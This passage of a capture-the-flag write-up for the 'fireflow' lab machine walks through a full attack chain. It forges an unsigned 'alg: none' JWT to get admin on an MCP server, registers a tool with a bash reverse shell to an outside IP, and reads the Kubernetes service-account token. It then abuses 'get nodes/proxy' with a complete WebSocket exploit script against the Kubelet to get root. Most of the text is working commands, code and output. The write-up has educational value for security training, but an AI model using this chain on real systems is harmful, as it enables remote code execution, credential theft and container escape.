+  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
+  -H "Content-Type: application/json" \
+  -d '{"name":"testadmin","description":"test","code":"print(1)"}'
+<span class="prompt-line">{"status":"registered","name":"testadmin"}</span>nightfall@fireflow:~/.mcp$</pre>
+    </div>
+
+    <p>This confirms that the JWT <code>alg: none</code> vulnerability is genuinely present and exploitable — the server accepted a forged token with no cryptographic signature at all and treated it as full admin, even though this endpoint was explicitly marked as admin-only.</p>
+
+    <p>This means I now have full admin privileges on the MCP server and can register any tool with any Python code I want, which effectively gives me remote code execution on this server. Now I want to try running the tool to see whether it actually works or not.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">tools/call — testadmin</span>
+      </div>
+      <pre>curl -s http://10.129.244.214:30080/mcp \
+  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"testadmin","arguments":{}}}'
+<span class="prompt-line">{"jsonrpc":"2.0","id":4,"result":{"content":[{"type":"text","text":"1\n"}],"isError":false}}</span></pre>
+    </div>
+
+    <p>The tool actually works — the response shows a text output of <code>1</code>, which is the real result of executing <code>print(1)</code> in Python on the server, meaning the code was genuinely executed and not just registered successfully. <code>isError</code> is also <code>false</code>, confirming the execution completed without errors.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">listener</span>
+      </div>
+      <pre><span class="prompt-line">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt-line">└─# nc -lvnp 4444</span>
+listening on [any] 4444 ...</pre>
+    </div>
+
+    <p>I open a listener on port 4444 so that I can create a tool that gives me a reverse shell, then register a new tool containing reverse shell code.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">register reverse-shell tool</span>
+      </div>
+      <pre>nightfall@fireflow:~/.mcp$ curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
+  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name": "exploitnotes",
+    "description": "evil",
+    "code": "import os; os.system(\"bash -c \\\"bash -i >&amp; /dev/tcp/10.10.14.139/4444 0>&amp;1\\\"\")"
+  }'
+<span class="prompt-line">{"status":"registered","name":"exploitnotes"}</span></pre>
+    </div>
+
+    <p>I run it now and get a shell.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">tools/call — exploitnotes</span>
+      </div>
+      <pre>curl -s http://10.129.244.214:30080/mcp \
+  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"exploitnotes","arguments":{}}}'</pre>
+    </div>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">nc -lvnp 4444</span>
+      </div>
+      <pre><span class="prompt-line">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt-line">└─# nc -lvnp 4444</span>
+listening on [any] 4444 ...
+connect to [10.10.14.139] from (UNKNOWN) [10.129.244.214] 46406
+<span class="warn-line">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span>
+<span class="warn-line">bash: no job control in this shell</span>
+mcp@mcp-server-54464cb475-29ztf:/app$
+mcp@mcp-server-54464cb475-29ztf:/app$ id
+id
+<span class="prompt-line">uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)</span>
+mcp@mcp-server-54464cb475-29ztf:/app$</pre>
+    </div>
+
+    <p>I am now inside a completely isolated container, called a "pod," which serves as the runtime environment for the MCP server.</p>
+  </section>
+
+  <section>
+    <h2>Kubernetes Enumeration</h2>
+
+    <p>From this format, <code>mcp@mcp-server-54464cb475-29ztf:/app</code>, I can tell this is a Kubernetes naming signature.</p>
+
+    <p>Now I know I am inside a Kubernetes environment, but knowing this alone is not enough — I need a key that allows me to actually communicate with the Kubernetes API. The next step is to confirm this and extract the token using the command that reads the token file located at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">service account token</span>
+      </div>
+      <pre>mcp@mcp-server-54464cb475-29ztf:/app$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+&lt;var/run/secrets/kubernetes.io/serviceaccount/token)</pre>
+    </div>
+
+    <p>The command executes without any errors, which is a good sign that the file actually exists and was read successfully and its content was stored inside the <code>TOKEN</code> variable. I still need to make sure the token actually contains real content before using it for anything, so I check it with <code>echo $TOKEN</code>.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">echo $TOKEN</span>
+      </div>
+      <pre>mcp@mcp-server-54464cb475-29ztf:/app$ echo $TOKEN
+echo $TOKEN
+<span class="comment-line">eyJhbGciOiJSUzI1NiIsImtpZCI6ImFQRTZ5R3JrSUpadmdid19HcHBTRTBYUFJZWUxqeGcxUHJIaFJjTEVSdm8ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODIxMDEwNjg5LCJpYXQiOjE3ODk0NzQ2ODksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZmUwOWUzMWQtZWQ2NS00ODNlLWJhNjQtNDY4ZjZiYzk0NWFjIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZmlyZWZsb3ciLCJ1aWQiOiI4NzI5MTU4OC0wMTc4LTRlNDItYTk5OC00MWE1MmZhNzNiOGUifSwicG9kIjp7Im5hbWUiOiJtY3Atc2VydmVyLTU0NDY0Y2I0NzUtMjl6dGYiLCJ1aWQiOiI3MDJhZmViYi00ZjUxLTRlZDUtYWE5OC1hYjZiMjU1M2E3MjgifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im1jcC1zYSIsInVpZCI6ImE1MzRmNTUxLWIyYjEtNGU2Ni1iZGE1LWU5YjVlMmE1NjAyYyJ9LCJ3YXJuYWZ0ZXIiOjE3ODk0NzgyOTZ9LCJuYmYiOjE3ODk0NzQ2ODksInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0Om1jcC1zYSJ9.gkGWaBmLYzJyK3JBaakprdHf_rxoZysM_2CnrIW_kR26zOIeqkX-1jIgiTPh31IS6WcWSLdGmtjGgboq90J0V1X_K7Fx3jwDC6M7FsDXNy6APXKilc7pB_Swm5AwJo7A2ZkZYLFtVMxcpf5Ql2cSBU00thlhRrKFsdPC1lcfMIDwSw89z6JiZlDhv4XcijbtzqjqggBtZEEaOsQVf1jG1YADiSRfexx1ps6YJfAQzYHN7VV0CZftXDOMzUcZhXMz4T26E9sINwWB060TIYdi4C2M4mxSRBht-DS4EZ5KHF1WUSh5P0zAR3Xv1cNXtmDsHGknXkZje4tc2IK4rdnUcg</span>
+mcp@mcp-server-54464cb475-29ztf:/app$</pre>
+    </div>
+
+    <p>I decode the payload part of the token (the middle section):</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">decoded JWT payload</span>
+      </div>
+      <pre>{
+  "aud": ["https://kubernetes.default.svc.cluster.local", "k3s"],
+  "iss": "https://kubernetes.default.svc.cluster.local",
+  "kubernetes.io": {
+    "namespace": "default",
+    "node": {
+      "name": "fireflow",
+      "uid": "..."
+    },
+    "pod": {
+      "name": "mcp-server-54464cb475-29ztf",
+      "uid": "..."
+    },
+    "serviceaccount": {
+      "name": "mcp-sa",
+      "uid": "..."
+    }
+  },
+  <span class="prompt-line">"sub": "system:serviceaccount:default:mcp-sa"</span>
+}</pre>
+    </div>
+
+    <p>Now I need to find out the address of the Kubernetes API server.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">KUBERNETES_SERVICE_HOST / PORT</span>
+      </div>
+      <pre>echo $KUBERNETES_SERVICE_HOST
+<span class="prompt-line">10.43.0.1</span>
+mcp@mcp-server-54464cb475-29ztf:/app$ echo $KUBERNETES_SERVICE_PORT
+echo $KUBERNETES_SERVICE_PORT
+<span class="prompt-line">443</span>
+mcp@mcp-server-54464cb475-29ztf:/app$</pre>
+    </div>
+
+    <p>Right now I need to know my limits, so I check what my service account is actually allowed to do.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">SelfSubjectRulesReview</span>
+      </div>
+      <pre>mcp@mcp-server-54464cb475-29ztf:/app$ curl -sk -H "Authorization: Bearer $TOKEN" -X POST \
+  https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
+  -H "Content-Type: application/json" \
+  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
+{
+  "kind": "SelfSubjectRulesReview",
+  "apiVersion": "authorization.k8s.io/v1",
+  "metadata": {},
+  "spec": {},
+  "status": {
+    "resourceRules": [
+      {
+        "verbs": ["create"],
+        "apiGroups": ["authorization.k8s.io"],
+        "resources": ["selfsubjectaccessreviews","selfsubjectrulesreviews"]
+      },
+      {
+        "verbs": ["create"],
+        "apiGroups": ["authentication.k8s.io"],
+        "resources": ["selfsubjectreviews"]
+      },
+      {
+        <span class="prompt-line">"verbs": ["get"],</span>
+        "apiGroups": [""],
+        <span class="prompt-line">"resources": ["nodes/proxy"]</span>
+      }
+    ],
+    "nonResourceRules": [
+      {
+        "verbs": ["get"],
+        "nonResourceURLs": ["/api","/api/*","/apis","/apis/*","/healthz","/livez","/openapi","/openapi/*","/readyz","/version","/version/"]
+      },
+      {
+        "verbs": ["get"],
+        "nonResourceURLs": ["/.well-known/openid-configuration","/.well-known/openid-configuration/","/openid/v1/jwks","/openid/v1/jwks/"]
+      },
+      {
+        "verbs": ["get"],
+        "nonResourceURLs": ["/healthz","/livez","/readyz","/version","/version/"]
+      }
+    ],
+    "incomplete": false
+  }</pre>
+    </div>
+
+    <p>The key takeaway: <code>get nodes/proxy</code> — the gateway upon which I will build everything else. This permission only lets me <code>GET</code> through the API server's proxy to a node's Kubelet; it does not let me <code>create</code> an exec session through the API server itself (that would need <code>create nodes/proxy</code>), which is why the next steps go through the Kubelet's own endpoints directly rather than through the standard <code>kubectl exec</code> path.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">list pods via nodes/proxy</span>
+      </div>
+      <pre>curl -sk -H "Authorization: Bearer $TOKEN" \
+  "https://&lt;API-SERVER&gt;:443/api/v1/nodes/fireflow/proxy/pods" \
+  | python3 -m json.tool | grep -E '"name"|"namespace"'</pre>
+    </div>
+
+    <p>I use the <code>nodes/proxy</code> permission to have the API server forward the request directly to the Kubelet running on the <code>fireflow</code> node and retrieve a list of all pods running on that node. I find several pods on a single node named <code>fireflow</code> — most notably <code>prometheus-prometheus-node-exporter-nmntq</code> in the <code>monitoring</code> namespace. This pod has mounts for <code>/proc</code>, <code>/sys</code>, and the node's root filesystem, making it an ideal target for exploitation and accessing host files.</p>
+  </section>
+
+  <section>
+    <h2>Node Escape</h2>
+
+    <p>I first attempt the standard Kubelet exec path through the Kubernetes API, but it is rejected because the service account only has <code>get nodes/proxy</code> and lacks <code>create nodes/proxy</code>. A direct HTTP request to the Kubelet's <code>/run</code> endpoint is also denied. This leads me to investigate the Kubelet's WebSocket-based <code>/exec</code> endpoint, which the <code>get nodes/proxy</code> permission is sufficient to reach.</p>
+
+    <p>I use <code>exploit.py</code>, a WebSocket client that talks directly to the Kubelet and runs commands inside the <code>node-exporter</code> container.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">exploit.py</span>
+      </div>
+      <pre>cat > /tmp/exploit.py &lt;&lt; 'EOF'
+import asyncio, ssl, sys, websockets
+
+NODE = "&lt;IP&gt;"
+NE_NS, NE_POD, NE_CNT = "monitoring", "prometheus-prometheus-node-exporter-nmntq", "node-exporter"
+TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
+COMMAND = sys.argv[1] if len(sys.argv) &gt; 1 else 'id'
+
+async def ws_exec(cmd):
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    args = "&amp;".join(f"command={p}" for p in cmd.split())
+    url = f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}?output=1&amp;error=1&amp;{args}"
+    async with websockets.connect(url, ssl=ctx, additional_headers={"Authorization": f"Bearer {TOKEN}"},
+                                   subprotocols=["v4.channel.k8s.io"], open_timeout=10) as ws:
+        try:
+            while True:
+                data = await asyncio.wait_for(ws.recv(), timeout=5)
+                if isinstance(data, bytes) and len(data) &gt; 1:
+                    print(data[1:].decode(errors='replace'), end='')
+        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
+            pass
+
+asyncio.run(ws_exec(COMMAND))
+EOF</pre>
+    </div>
+
+    <p>I test it to be sure:</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">python3 exploit.py "id"</span>
+      </div>
+      <pre>mcp@mcp-server-54464cb475–29ztf:/app$ python3 /tmp/exploit.py "id"
+
+ <span class="prompt-line">uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)</span></pre>
+    </div>
+
+    <p>The WebSocket connection succeeds, giving me command execution inside the <code>node-exporter</code> container with <code>uid=0(root)</code>. I use this access to read the root flag from the host filesystem mounted into the pod:</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">python3 exploit.py "cat /host/root/root.txt"</span>
+      </div>
+      <pre>mcp@mcp-server-54464cb475-29ztf:/app$ python3 /tmp/exploit.py "cat /host/root/root.txt"
+
+<span class="prompt-line">0d8df813d0357cf3f36cac09a8e661</span></pre>
+    </div>
+
+    <p><span class="flag-hit">Now We Have Root Shell ✅</span></p>
+
+    <div class="placeholder-img">🖼 image.png — root flag confirmed</div>
+  </section>
+
+  <footer>
+    end of writeup — fireflow.htb
+  </footer>
+
+</div>
+</body>
+</html>
